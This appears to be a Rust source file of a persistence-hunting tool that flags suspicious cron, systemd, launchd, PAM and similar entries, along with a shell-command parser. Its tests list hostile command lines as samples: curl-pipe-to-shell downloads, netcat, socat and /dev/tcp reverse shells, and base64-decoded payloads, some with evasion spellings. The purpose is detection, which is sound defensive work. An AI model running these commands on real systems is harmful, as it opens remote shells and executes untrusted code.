//! The persistence checks of `persistence-hunter`: plain functions in one static table, each
//! mapped to an ATT&CK technique. A check looks at one parsed record and returns the reason
//! when it matches. This is not a plugin system and not a rule language.

use clap::ValueEnum;
use serde::Serialize;
use serde_json::Value;
use Severity::{High, Low, Medium};

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, ValueEnum)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
}

pub struct Check {
    pub id: &'static str,
    pub artifact: &'static str,
    pub technique: &'static str,
    pub tactic: &'static str,
    pub severity: Severity,
    pub title: &'static str,
    /// The reason (detail text) when the record matches.
    pub test: fn(&Value) -> Option<String>,
}

const fn chk(
    id: &'static str,
    artifact: &'static str,
    technique: &'static str,
    tactic: &'static str,
    severity: Severity,
    title: &'static str,
    test: fn(&Value) -> Option<String>,
) -> Check {
    Check { id, artifact, technique, tactic, severity, title, test }
}

const PERSIST: &str = "Persistence";

/// One row per (check, artifact). A check that needs a different technique for a different kind
/// of record (launchd agents and daemons, cron scripts and init scripts) appears twice.
pub static CHECKS: &[Check] = &[
    chk("cron-suspicious-command", "cron", "T1053.003", PERSIST, High, "Cron job runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk("cron-reboot-job", "cron", "T1053.003", PERSIST, Low, "Cron job runs at every boot", |r| {
        (text(r, "schedule") == "@reboot").then(|| format!("@reboot: {}", text(r, "command")))
    }),
    chk(
        "cron-script-writable",
        "cron-scripts",
        "T1053.003",
        PERSIST,
        Medium,
        "Cron script is writable or not owned by root",
        script_writable,
    ),
    chk(
        "cron-script-writable",
        "init-d",
        "T1037.004",
        PERSIST,
        Medium,
        "Init script is writable or not owned by root",
        script_writable,
    ),
    chk("at-job", "at-jobs", "T1053.002", PERSIST, Low, "Queued at job", |r| {
        Some(format!("at job: {}", text(r, "command")))
    }),
    chk("at-job-suspicious", "at-jobs", "T1053.002", PERSIST, High, "At job runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk(
        "anacron-suspicious-command",
        "anacron",
        "T1053.003",
        PERSIST,
        High,
        "Anacron job runs a suspicious command",
        |r| susp(r, "command"),
    ),
    chk(
        "systemd-suspicious-exec",
        "systemd-units",
        "T1543.002",
        PERSIST,
        High,
        "systemd unit runs a suspicious command",
        systemd_exec,
    ),
    chk(
        "systemd-user-unit",
        "systemd-units",
        "T1543.002",
        PERSIST,
        Low,
        "systemd unit in a user's home directory",
        |r| {
            let path = text(r, "source_path");
            ["home/", "root/", "Users/"].iter().any(|p| path.starts_with(p)).then(|| format!("unit file {path}"))
        },
    ),
    chk("rc-local-command", "rc-local", "T1037.004", PERSIST, Low, "rc.local runs a command at boot", |r| {
        let line = text(r, "text").trim();
        (line != "exit 0").then(|| line.to_string())
    }),
    chk("rc-local-suspicious", "rc-local", "T1037.004", PERSIST, High, "rc.local runs a suspicious command", |r| {
        susp(r, "text")
    }),
    chk(
        "shell-profile-suspicious",
        "shell-profiles",
        "T1546.004",
        PERSIST,
        Medium,
        "Shell startup file with suspicious content",
        shell_profile,
    ),
    chk("ld-preload-entry", "ld-preload", "T1574.006", PERSIST, High, "Library listed in ld.so.preload", |r| {
        (text(r, "kind") == "preload").then(|| format!("preloads {}", text(r, "path")))
    }),
    chk(
        "ld-library-path-writable",
        "ld-preload",
        "T1574.006",
        PERSIST,
        High,
        "Linker search path in a temporary directory",
        |r| {
            let path = text(r, "path");
            (text(r, "kind") == "library_path" && starts_with_temp(path)).then(|| format!("search path {path}"))
        },
    ),
    chk("systemd-ld-preload", "systemd-units", "T1574.006", PERSIST, High, "systemd unit sets LD_PRELOAD", |r| {
        let environment = text(r, "environment");
        environment.contains("LD_PRELOAD=").then(|| format!("Environment={environment}"))
    }),
    chk(
        "authorized-key-forced-command",
        "authorized-keys",
        "T1098.004",
        PERSIST,
        Medium,
        "authorized_keys entry with a forced command",
        |r| r["forced_command"].as_str().map(|c| format!("forced command: {c}")),
    ),
    chk("authorized-key-root", "authorized-keys", "T1098.004", PERSIST, Low, "SSH key authorized for root", |r| {
        (text(r, "user") == "root").then(|| format!("key {} ({})", text(r, "fingerprint"), text(r, "comment")))
    }),
    chk("udev-run-suspicious", "udev-rules", "T1546.017", PERSIST, High, "udev rule runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk(
        "modprobe-install-command",
        "modules-load",
        "T1547.006",
        PERSIST,
        Medium,
        "modprobe install directive runs a command",
        modprobe_install,
    ),
    chk("pam-exec-module", "pam", "T1556.003", "Credential Access", Medium, "PAM stack runs pam_exec", |r| {
        (text(r, "module_type") != "@include" && text(r, "module").ends_with("pam_exec.so"))
            .then(|| format!("{}: pam_exec.so {}", text(r, "service"), text(r, "arguments")))
    }),
    chk(
        "pam-module-unusual-path",
        "pam",
        "T1556.003",
        "Credential Access",
        High,
        "PAM module loaded from an unusual path",
        |r| {
            let module = text(r, "module");
            let usual = ["/lib/", "/lib64/", "/usr/lib/", "/usr/lib64/", "/usr/lib32/", "/lib32/"];
            (module.starts_with('/') && !usual.iter().any(|p| module.starts_with(p)))
                .then(|| format!("{}: {module}", text(r, "service")))
        },
    ),
    chk(
        "xdg-autostart-suspicious",
        "xdg-autostart",
        "T1547.013",
        PERSIST,
        High,
        "Autostart entry runs a suspicious command",
        |r| susp(r, "exec"),
    ),
    chk("passwd-extra-uid0", "passwd", "T1136.001", PERSIST, High, "Account other than root with uid 0", |r| {
        (r["uid"].as_u64() == Some(0) && text(r, "user") != "root").then(|| format!("{} has uid 0", text(r, "user")))
    }),
    chk(
        "passwd-password-in-passwd",
        "passwd",
        "T1078.003",
        PERSIST,
        Medium,
        "Password field set in /etc/passwd",
        |r| {
            let field = text(r, "password_field");
            (!["x", "*", "!"].contains(&field)).then(|| format!("{}: password field is not x", text(r, "user")))
        },
    ),
    chk("shadow-passwordless", "shadow", "T1078.003", PERSIST, High, "Account has an empty password", |r| {
        (r["passwordless"] == true).then(|| format!("{} can log in without a password", text(r, "user")))
    }),
    chk(
        "sudoers-nopasswd-all",
        "sudoers",
        "T1548.003",
        "Privilege Escalation",
        Medium,
        "sudo rule allows every command without a password",
        |r| {
            let all = text(r, "commands").split(',').any(|c| c.trim() == "ALL");
            (text(r, "kind") == "rule" && r["nopasswd"] == true && all).then(|| text(r, "text").to_string())
        },
    ),
    chk(
        "launchd-suspicious-program",
        "launchd",
        "T1543.001",
        PERSIST,
        High,
        "LaunchAgent runs a suspicious command",
        |r| launchd_exec(r, "_agent"),
    ),
    chk(
        "launchd-suspicious-program",
        "launchd",
        "T1543.004",
        PERSIST,
        High,
        "LaunchDaemon runs a suspicious command",
        |r| launchd_exec(r, "_daemon"),
    ),
    chk(
        "launchd-apple-label-outside-system",
        "launchd",
        "T1036.004",
        "Defense Evasion",
        Medium,
        "com.apple. label outside System/Library",
        |r| {
            let (label, path) = (text(r, "label"), text(r, "source_path"));
            // A user agent that runs an Apple binary (the stock CSConfigDotMacCert agent) is not
            // pretending to be anything.
            let program = launchd_program(r);
            let apple_binary =
                text(r, "scope") == "user_agent" && ["/System/", "/usr/"].iter().any(|p| program.starts_with(p));
            (label.starts_with("com.apple.") && !path.starts_with("System/Library/") && !apple_binary)
                .then(|| format!("{label} in {path}"))
        },
    ),
    chk(
        "launchd-user-agent-persistent",
        "launchd",
        "T1543.001",
        PERSIST,
        Low,
        "User LaunchAgent starts a program from a user location",
        |r| {
            let program = launchd_program(r);
            let usual = ["/Applications/", "/System/", "/Library/", "/usr/"];
            let persistent = r["run_at_load"] == true || r["keep_alive"].as_str().is_some_and(|k| k != "false");
            (text(r, "scope") == "user_agent" && persistent && !usual.iter().any(|p| program.starts_with(p)))
                .then(|| program.to_string())
        },
    ),
    chk("launchd-dyld-insert", "launchd", "T1574.006", PERSIST, High, "launchd job sets DYLD_INSERT_LIBRARIES", |r| {
        let library = r["environment"]["DYLD_INSERT_LIBRARIES"].as_str()?;
        Some(format!("{} injects {library}", text(r, "label")))
    }),
    chk("emond-rule-command", "emond", "T1546.014", PERSIST, High, "Event Monitor rule runs a command", |r| {
        let command = text(r, "command");
        (!command.is_empty() && r["enabled"] != false).then(|| format!("{}: {command}", text(r, "rule")))
    }),
    chk("kext-third-party", "kernel-extensions", "T1547.006", PERSIST, Low, "Third-party kernel extension", |r| {
        Some(format!("{} ({})", text(r, "bundle_id"), text(r, "executable")))
    }),
    chk("btm-item-unsigned", "btm", "T1547.015", PERSIST, Low, "Background item without a signing identity", |r| {
        let path = text(r, "executable_path");
        let anonymous = text(r, "team_id").is_empty() && ["", "Unknown Developer"].contains(&text(r, "developer_name"));
        (anonymous && !path.is_empty() && !path.starts_with("/System/")).then(|| path.to_string())
    }),
];

/// A string field of a record; empty when the field is missing or not text.
pub fn text<'a>(record: &'a Value, field: &str) -> &'a str {
    record.get(field).and_then(Value::as_str).unwrap_or("")
}

fn susp(record: &Value, field: &str) -> Option<String> {
    let command = text(record, field);
    suspicious_command(command).map(|why| format!("{why}: {command}"))
}

fn script_writable(record: &Value) -> Option<String> {
    let mode = u32::from_str_radix(text(record, "mode"), 8).ok()?;
    let mut why = Vec::new();
    if mode & 0o020 != 0 {
        why.push("group-writable".to_string());
    }
    if mode & 0o002 != 0 {
        why.push("world-writable".to_string());
    }
    if record["uid"].as_u64().is_some_and(|uid| uid != 0) {
        why.push(format!("owned by uid {}", record["uid"]));
    }
    (!why.is_empty()).then(|| format!("{} (mode {mode:o})", why.join(", ")))
}

fn systemd_exec(record: &Value) -> Option<String> {
    ["exec_start", "exec_start_pre", "exec_start_post", "exec_stop", "exec_reload"]
        .iter()
        .find_map(|field| susp(record, field).map(|detail| format!("{field} {detail}")))
}

fn shell_profile(record: &Value) -> Option<String> {
    let line = text(record, "text");
    if line.trim_start().starts_with('#') {
        return None;
    }
    susp(record, "text").or_else(|| {
        ["LD_PRELOAD=", "PROMPT_COMMAND=", "alias sudo=", "alias su="]
            .iter()
            .find(|needle| line.contains(**needle))
            .map(|needle| format!("sets {needle}: {line}"))
    })
}

fn modprobe_install(record: &Value) -> Option<String> {
    let args = text(record, "arguments").trim();
    let chained = args.contains([';', '&', '|']);
    let first = args.split_whitespace().next().unwrap_or("").rsplit('/').next().unwrap_or("");
    let blocks_load = ["true", "false"].contains(&first) && !chained;
    let defers_to_modprobe = args.starts_with("/sbin/modprobe --ignore-install") && !chained;
    (text(record, "kind") == "install" && !args.is_empty() && !blocks_load && !defers_to_modprobe)
        .then(|| format!("install {}: {args}", text(record, "module")))
}

/// The program of a launchd job: `Program`, or the first `ProgramArguments` entry.
fn launchd_program(record: &Value) -> &str {
    match text(record, "program") {
        "" => record["program_arguments"][0].as_str().unwrap_or(""),
        program => program,
    }
}

/// What a launchd job runs: `Program`, then `ProgramArguments` after the first (which `Program`
/// replaces); with no `Program`, the `ProgramArguments`.
fn launchd_command(record: &Value) -> String {
    let args: Vec<&str> =
        record["program_arguments"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
    match text(record, "program") {
        "" => args.join(" "),
        program => std::iter::once(program).chain(args.iter().skip(1).copied()).collect::<Vec<_>>().join(" "),
    }
}

fn launchd_exec(record: &Value, scope_suffix: &str) -> Option<String> {
    if !text(record, "scope").ends_with(scope_suffix) {
        return None;
    }
    let line = launchd_command(record);
    suspicious_command(&line)
        .or_else(|| has_word(&line, "curl").then_some("runs curl from a launchd job"))
        .map(|why| format!("{why}: {}", line.trim()))
}

/// The fields of a record that hold something to run or a path to it: the text the checks
/// look at. A profile's `allow` `contains` is matched against these (and the finding's
/// detail), never against the whole record, where an attacker could plant the allowed text
/// in a field that does not matter (such as `StandardOutPath`).
const EXEC_FIELDS: [&str; 16] = [
    "command",
    "program",
    "program_arguments",
    "arguments",
    "exec",
    "exec_start",
    "exec_start_pre",
    "exec_start_post",
    "exec_stop",
    "exec_reload",
    "text",
    "path",
    "executable",
    "executable_path",
    "forced_command",
    "module",
];

/// The text of [`EXEC_FIELDS`] in a record, one field per line.
pub fn executable_text(record: &Value) -> String {
    let mut out = String::new();
    for field in EXEC_FIELDS {
        match &record[field] {
            Value::String(s) => out.push_str(s),
            Value::Array(items) => out.push_str(&items.iter().filter_map(Value::as_str).collect::<Vec<_>>().join(" ")),
            _ => continue,
        }
        out.push('\n');
    }
    out
}

/// Directories anyone can write to (compared in lower case, after the path is resolved).
const TEMP_DIRS: [&str; 6] = ["/tmp", "/var/tmp", "/dev/shm", "/private/tmp", "/private/var/tmp", "/users/shared"];
/// Hidden names (without the dot) that are ordinary in commands and shell startup files.
const BENIGN_HIDDEN: [&str; 24] = [
    "config",
    "local",
    "cache",
    "ssh",
    "gnupg",
    "cargo",
    "rustup",
    "nvm",
    "pyenv",
    "rbenv",
    "bashrc",
    "bash_profile",
    "bash_login",
    "bash_logout",
    "bash_aliases",
    "profile",
    "zshrc",
    "zprofile",
    "zshenv",
    "inputrc",
    "dircolors",
    "well-known",
    "dockerenv",
    "oh-my-zsh",
];
const SHELLS: [&str; 5] = ["sh", "bash", "zsh", "dash", "ksh"];
const INTERPRETERS: [&str; 9] = ["sh", "bash", "zsh", "dash", "ksh", "perl", "ruby", "php", "node"];
/// Commands that run the command that follows them.
const WRAPPERS: [&str; 13] = [
    "sudo",
    "doas",
    "nohup",
    "exec",
    "env",
    "setsid",
    "nice",
    "ionice",
    "timeout",
    "command",
    "time",
    "caffeinate",
    "arch",
];
/// Words that start a shell statement without being the command.
const KEYWORDS: [&str; 8] = ["if", "then", "else", "elif", "do", "while", "until", "!"];
const FETCHERS: [&str; 2] = ["curl", "wget"];
const NETCATS: [&str; 3] = ["nc", "ncat", "netcat"];
/// Code given to an inline interpreter that talks to the network or unpacks a payload.
const INLINE_PAYLOAD: [&str; 8] =
    ["socket", "/dev/tcp/", "pty.spawn", "urlopen", "b64decode", "base64", "fromhex", "decompress"];

/// `/a//b/./c/../d` to `/a/b/d`. Relative paths are returned as they are.
fn resolve_path(path: &str) -> String {
    if !path.starts_with('/') {
        return path.to_string();
    }
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            part => parts.push(part),
        }
    }
    format!("/{}", parts.join("/"))
}

/// True for a path in a world-writable or temporary directory: the system temp directories,
/// `/Users/Shared`, and macOS per-user `/var/folders/xx/yyyy/T`. Case does not matter (the
/// default macOS volume ignores it) and `//`, `/./` and `/../` are resolved first.
fn starts_with_temp(path: &str) -> bool {
    let path = resolve_path(path).to_ascii_lowercase();
    if TEMP_DIRS.iter().any(|dir| path == *dir || path.strip_prefix(dir).is_some_and(|rest| rest.starts_with('/'))) {
        return true;
    }
    let folders = path.strip_prefix("/private").unwrap_or(&path).strip_prefix("/var/folders/");
    folders.is_some_and(|rest| rest.split('/').nth(2) == Some("t"))
}

/// `needle` at the start of a word: `nc ` matches in `nc -e` but not in `rsync `.
fn has_word(command: &str, needle: &str) -> bool {
    command.match_indices(needle).any(|(i, _)| !command[..i].ends_with(|c: char| c.is_ascii_alphanumeric() || c == '_'))
}

/// The file name of a command word, lower-cased, without systemd's `-@+!:` prefixes.
fn base_name(word: &str) -> String {
    let word = word.trim_start_matches(['-', '@', '+', '!', ':']);
    word.rsplit('/').next().unwrap_or("").to_ascii_lowercase()
}

fn is_interpreter(word: &str) -> bool {
    let name = base_name(word);
    INTERPRETERS.contains(&name.as_str()) || name.starts_with("python")
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=')
        .is_some_and(|(name, _)| !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
}

/// One simple command of a command line.
struct Segment {
    /// Joined to the previous segment by a single `|`.
    piped: bool,
    words: Vec<String>,
}

impl Segment {
    /// Index of the command word: after assignments, wrappers (`sudo -E`, `env`) and keywords.
    fn command_index(&self) -> Option<usize> {
        let mut i = 0;
        while let Some(word) = self.words.get(i) {
            let name = base_name(word);
            if is_assignment(word) || KEYWORDS.contains(&word.as_str()) {
                i += 1;
            } else if WRAPPERS.contains(&name.as_str()) {
                i += 1;
                // Options and a leading duration (`timeout 5`) belong to the wrapper.
                while let Some(next) = self.words.get(i) {
                    let option = next.starts_with('-');
                    if option || next.chars().all(|c| c.is_ascii_digit()) || is_assignment(next) {
                        // `sudo -u root`: the option takes a value.
                        i += 1 + usize::from(option && ["-u", "-g", "-h", "-p", "-C"].contains(&next.as_str()));
                    } else {
                        break;
                    }
                }
            } else {
                return Some(i);
            }
        }
        None
    }

    fn command(&self) -> Option<&str> {
        self.command_index().map(|i| self.words[i].as_str())
    }

    fn name(&self) -> String {
        self.command().map(base_name).unwrap_or_default()
    }

    /// The words after the command word.
    fn args(&self) -> &[String] {
        self.command_index().map_or(&[], |i| &self.words[i + 1..])
    }

    /// The script an interpreter runs: its first argument that is not an option.
    fn script(&self) -> Option<&str> {
        let command = self.command()?;
        is_interpreter(command).then(|| self.args().iter().find(|w| !w.starts_with('-')).map(String::as_str))?
    }

    /// The file this segment runs: the command, or the script an interpreter is given.
    fn runs(&self) -> impl Iterator<Item = &str> {
        let command = self.command().filter(|c| c.contains('/') || c.starts_with("./"));
        command.into_iter().chain(self.script())
    }
}

/// Brace lists as shells expand them: `{echo,hi}` is `echo hi`.
fn expand_braces(text: &str) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(open) = rest.find('{') {
        let list = rest[open + 1..].split_once('}').map(|(inner, _)| inner);
        match list.filter(|l| l.contains(',') && !l.contains([' ', '$', '{'])) {
            Some(list) => {
                out.push_str(&rest[..open]);
                out.push(' ');
                out.push_str(&list.replace(',', " "));
                out.push(' ');
                rest = &rest[open + list.len() + 2..];
            }
            None => {
                out.push_str(&rest[..=open]);
                rest = &rest[open + 1..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// A command line as simple commands: the comment cut off, quotes removed (so the command of
/// `sh -c "cd /tmp; ./x"` is read like any other), `${IFS}` read as a space, and split at
/// `; | & ( )`. `sh -c` is split once more, so its string is a command of its own.
fn segments(command: &str) -> Vec<Segment> {
    let mut text = command.replace("${IFS}", " ").replace("$IFS", " ").replace('\n', ";");
    if let Some((at, _)) =
        text.char_indices().find(|&(i, c)| c == '#' && (i == 0 || text[..i].ends_with([' ', '\t', ';'])))
    {
        text.truncate(at);
    }
    let text = expand_braces(&text).replace(['"', '\''], "");
    let (mut out, mut piped, mut current) = (Vec::new(), false, String::new());
    let chars: Vec<char> = text.chars().collect();
    let flush = |current: &mut String, piped: bool, out: &mut Vec<Segment>| {
        let words: Vec<String> = current.split_whitespace().map(str::to_string).collect();
        if !words.is_empty() {
            out.push(Segment { piped, words });
        }
        current.clear();
    };
    for (i, &c) in chars.iter().enumerate() {
        let redirect = c == '&' && (i > 0 && chars[i - 1] == '>' || chars.get(i + 1) == Some(&'>'));
        match c {
            '|' if chars.get(i + 1) != Some(&'|') && (i == 0 || chars[i - 1] != '|') => {
                flush(&mut current, piped, &mut out);
                piped = true;
            }
            // `$(` and `<(` stay in the word: `runs_substitution` looks for them.
            '(' if i > 0 && (chars[i - 1] == '$' || chars[i - 1] == '<') => current.push(c),
            ';' | '|' | '&' | '(' | ')' if !redirect => {
                flush(&mut current, piped, &mut out);
                piped = false;
            }
            c => current.push(c),
        }
    }
    flush(&mut current, piped, &mut out);
    split_shell_c(out)
}

/// `sh -c cd /tmp` becomes `sh -c` and `cd /tmp`.
fn split_shell_c(segments: Vec<Segment>) -> Vec<Segment> {
    let mut out = Vec::new();
    for mut segment in segments {
        loop {
            let at = segment.command_index().filter(|_| SHELLS.contains(&segment.name().as_str())).and_then(|i| {
                let options = segment.words[i + 1..].iter().take_while(|w| w.starts_with('-'));
                options.enumerate().find(|(_, w)| !w.starts_with("--") && w.ends_with('c')).map(|(n, _)| i + 1 + n)
            });
            let Some(at) = at.filter(|&at| at + 1 < segment.words.len()) else { break };
            let rest = segment.words.split_off(at + 1);
            out.push(segment);
            segment = Segment { piped: false, words: rest };
        }
        out.push(segment);
    }
    out
}

fn is_fetch(segment: &Segment) -> bool {
    FETCHERS.contains(&segment.name().as_str())
}

/// True when a program or script runs from a temporary directory, including a relative one
/// after `cd` into it.
fn runs_from_temp(segments: &[Segment]) -> bool {
    let mut in_temp = false;
    segments.iter().any(|segment| {
        if segment.name() == "cd" {
            in_temp = segment.args().iter().find(|w| !w.starts_with('-')).is_some_and(|dir| starts_with_temp(dir));
            return false;
        }
        segment.runs().any(|file| {
            let file = file.trim_start_matches(['-', '@', '+', '!', ':']);
            starts_with_temp(file) || (in_temp && file.starts_with("./"))
        })
    })
}

/// True when a line starts inside a word list: `"$HOME/.dircolors"; do` is the rest of a `for`
/// header, whose first word is a value and not a command. Lines are read one at a time.
fn is_list_continuation(command: &str, segments: &[Segment]) -> bool {
    let starts_with_expansion = segments.first().and_then(Segment::command).is_some_and(|c| c.starts_with('$'));
    let continued = command.trim_end().ends_with('\\')
        || segments.get(1).is_some_and(|s| ["do", "then"].contains(&s.words[0].as_str()));
    starts_with_expansion && continued
}

/// True when a program or script has a hidden directory or file name in its path. Only the
/// command word and an interpreter's script count: `source ~/.fzf.bash` reads a dotfile,
/// it does not run one.
fn runs_hidden_path(segments: &[Segment], skip_first: bool) -> bool {
    segments.iter().skip(usize::from(skip_first)).any(|segment| {
        segment.runs().any(|file| {
            file.split('/').any(|part| {
                let name = part.strip_prefix('.').unwrap_or("");
                name.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') && !BENIGN_HIDDEN.contains(&name)
            })
        })
    })
}

/// A mode argument that makes a file executable (`+x`, `755`).
fn makes_executable(mode: &str) -> bool {
    if mode.chars().all(|c| c.is_ascii_digit()) {
        return !mode.is_empty() && mode.bytes().rev().take(3).any(|d| (d - b'0') & 1 == 1);
    }
    mode.split_once('+').is_some_and(|(_, bits)| bits.contains('x'))
}

fn downloads_and_executes(segments: &[Segment], words: &[&str]) -> bool {
    segments.iter().enumerate().filter(|(_, s)| is_fetch(s)).any(|(i, fetch)| {
        // curl ... | [sudo] sh
        let piped = segments[i + 1..].iter().take_while(|s| s.piped).any(|s| is_interpreter(s.command().unwrap_or("")));
        // curl -o f URL; chmod +x f; ./f
        let saved: Vec<&str> =
            fetch.args().iter().map(String::as_str).filter(|w| !w.starts_with('-') && !w.contains("://")).collect();
        let later = segments[i + 1..].iter().any(|s| {
            let chmod = s.name() == "chmod" && s.args().iter().any(|w| makes_executable(w));
            let runs_download = s.runs().any(|file| {
                let file = file.strip_prefix("./").unwrap_or(file);
                file.chars().any(|c| c.is_ascii_alphanumeric())
                    && saved.iter().any(|w| w.strip_prefix("./").unwrap_or(w) == file)
            });
            chmod || runs_download
        });
        piped || later
    }) || runs_substitution(words)
}

/// `bash -c "$(curl ...)"`, `eval $(curl ...)`, `source <(curl ...)`: the fetched text is the
/// code, given directly to something that runs it.
fn runs_substitution(words: &[&str]) -> bool {
    words.iter().enumerate().any(|(i, word)| {
        let Some(inner) =
            word.strip_prefix("$(").or_else(|| word.strip_prefix("<(")).or_else(|| word.strip_prefix('`'))
        else {
            return false;
        };
        let command = if inner.is_empty() { words.get(i + 1).copied().unwrap_or("") } else { inner };
        let runner = match i.checked_sub(1).map(|p| words[p]) {
            Some("-c") => i >= 2 && is_interpreter(words[i - 2]),
            Some(prev) => ["eval", "source", "."].contains(&prev),
            None => false,
        };
        runner && FETCHERS.contains(&base_name(command).as_str())
    })
}

fn decodes_payload(segments: &[Segment]) -> bool {
    segments.iter().any(|s| {
        let has = |flags: &[&str]| s.args().iter().any(|w| flags.contains(&w.as_str()));
        match s.name().as_str() {
            "base64" => has(&["-d", "-D", "--decode"]),
            "openssl" => has(&["enc", "base64"]) && has(&["-d"]),
            "xxd" => has(&["-r"]),
            _ => false,
        }
    })
}

/// `python -c`, `perl -e`, `ruby -e`, `php -r`, `node -e` with network or packed code.
fn inline_payload(words: &[&str]) -> bool {
    words.iter().enumerate().any(|(i, word)| {
        let name = base_name(word);
        let flag = match name.as_str() {
            n if n.starts_with("python") => "-c",
            "perl" | "ruby" | "node" => "-e",
            "php" => "-r",
            _ => return false,
        };
        let rest = words[i + 1..].join(" ").to_ascii_lowercase();
        words[i + 1..].contains(&flag) && INLINE_PAYLOAD.iter().any(|needle| rest.contains(needle))
    })
}

fn reverse_shell(segments: &[Segment], flat: &str) -> bool {
    let is_netcat = |s: &Segment| NETCATS.contains(&s.name().as_str());
    let netcat_exec = segments.iter().any(|s| {
        is_netcat(s) && s.args().iter().any(|w| ["-e", "-c", "--exec", "--sh-exec", "--lua-exec"].contains(&w.as_str()))
    });
    let fifo = segments.iter().any(|s| s.name() == "mkfifo") && segments.iter().any(is_netcat);
    let socat = segments.iter().any(|s| s.name() == "socat") && flat.to_ascii_lowercase().contains("exec:");
    netcat_exec || fifo || socat || flat.contains("/dev/tcp/") || flat.contains("/dev/udp/")
}

fn osascript_inline(segments: &[Segment]) -> bool {
    segments.iter().any(|s| s.name() == "osascript" && s.args().iter().any(|w| w == "-e" || w == "-l"))
}

/// The first reason a command line looks malicious, if any. These are heuristics for triage:
/// each reason is specific enough that ordinary administration rarely trips it. The line is
/// read as shell would: comments dropped, quotes removed, whitespace of any kind alike.
pub fn suspicious_command(command: &str) -> Option<&'static str> {
    let segments = segments(command);
    let flat = segments.iter().flat_map(|s| s.words.iter().map(String::as_str)).collect::<Vec<_>>();
    let text = flat.join(" ");
    let reasons: [(bool, &str); 7] = [
        (runs_from_temp(&segments), "runs from a world-writable or temporary directory"),
        (runs_hidden_path(&segments, is_list_continuation(command, &segments)), "runs from a hidden path"),
        (downloads_and_executes(&segments, &flat), "downloads and executes code"),
        (decodes_payload(&segments), "decodes an encoded payload"),
        (inline_payload(&flat), "inline interpreter with network or encoded code"),
        (reverse_shell(&segments, &text), "reverse-shell tooling"),
        (osascript_inline(&segments), "runs AppleScript from the command line"),
    ];
    reasons.iter().find(|(hit, _)| *hit).map(|&(_, why)| why)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn malicious_command_lines_are_flagged() {
        let bad = [
            ("/tmp/.x/payload --daemon", "temporary"),
            ("/var/tmp/update", "temporary"),
            ("nohup /dev/shm/miner -o pool.example.com &", "temporary"),
            ("bash /private/tmp/run.sh", "temporary"),
            ("/Users/Shared/helper", "temporary"),
            ("-/tmp/x", "temporary"),
            ("FOO=1 python3 /tmp/a.py", "temporary"),
            ("/usr/bin/true ; /tmp/x", "temporary"),
            ("/opt/app/.cache2/run", "hidden"),
            ("~/.hidden/agent --quiet", "hidden"),
            ("curl -fsSL http://203.0.113.5/i.sh | sh", "download"),
            ("wget -qO- http://198.51.100.7/x|bash", "download"),
            ("curl http://203.0.113.5/a -o /opt/a && chmod +x /opt/a", "download"),
            ("sh -c \"$(curl -fsSL http://203.0.113.5/i)\"", "download"),
            ("echo aGk= | base64 -d | sh", "encoded"),
            ("base64 --decode /opt/p | sh", "encoded"),
            ("openssl enc -d -aes-256-cbc -in /opt/p", "encoded"),
            ("python3 -c 'import socket,os;s=socket.socket()'", "inline"),
            ("perl -e 'use Socket;'; nc 203.0.113.5 4444", "inline"),
            ("nc -e /bin/sh 203.0.113.5 4444", "reverse"),
            ("socat TCP:203.0.113.5:4444 EXEC:/bin/sh", "reverse"),
            ("bash -c 'exec 5<>/dev/tcp/203.0.113.5/80'", "reverse"),
            ("osascript -e 'do shell script \"id\"'", "AppleScript"),
            // Evasions: other spellings of the same things.
            ("cd /tmp && ./x", "temporary"),
            ("/bin/sh -c \"cd /tmp; ./x\"", "temporary"),
            ("/private/var/tmp/x", "temporary"),
            ("/var/folders/ab/xyz/T/x", "temporary"),
            ("/TMP/x", "temporary"),
            ("//tmp/x", "temporary"),
            ("/./tmp/x", "temporary"),
            ("/usr/../tmp/x", "temporary"),
            ("sudo -u root /tmp/x", "temporary"),
            ("timeout 5 /tmp/x", "temporary"),
            ("bash -c \"$(/usr/bin/curl -fsSL http://203.0.113.9/x)\"", "download"),
            ("bash -c $(curl -fsSL http://203.0.113.9/x)", "download"),
            ("eval \"$(curl -fsSL http://203.0.113.9/x)\"", "download"),
            ("source <(curl -fsSL http://203.0.113.9/x)", "download"),
            ("curl -fsSL http://203.0.113.9/x | sudo -E bash", "download"),
            ("curl -fsSL http://203.0.113.9/x | /usr/bin/env bash", "download"),
            ("curl -o f http://203.0.113.9/x; chmod 755 f", "download"),
            ("curl -o /tmp/f http://203.0.113.9/x; sh /tmp/f", "temporary"),
            ("curl -o /opt/a http://203.0.113.9/a; sh /opt/a", "download"),
            ("curl${IFS}http://203.0.113.9/i|sh", "download"),
            ("python3 -c \"import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\"", "inline"),
            ("python3  -c 'import socket,pty;s=socket.socket()'", "inline"),
            ("python2.7 -c 'import socket,pty;s=socket.socket()'", "inline"),
            ("nc\t-e /bin/sh 203.0.113.9 4444", "reverse"),
            ("mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f", "reverse"),
            ("rm /tmp/f;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/g", "reverse"),
            ("ncat --sh-exec /bin/sh 203.0.113.9 4444", "reverse"),
            ("osascript -l JavaScript -e \"eval(ObjC.unwrap(x))\"", "AppleScript"),
            ("echo aGk= | base64\t-d | sh", "encoded"),
            ("base64 -D", "encoded"),
            ("{echo,Y3VybA==}|{base64,-d}|bash", "encoded"),
            ("sh /home/alice/.hidden/run.sh", "hidden"),
        ];
        for (command, expect) in bad {
            let why = suspicious_command(command).unwrap_or_else(|| panic!("not flagged: {command}"));
            assert!(why.contains(expect), "{command}: {why}");
        }
    }

    #[test]
    fn ordinary_command_lines_are_not_flagged() {
        let good = [
            "",
            "exit 0",
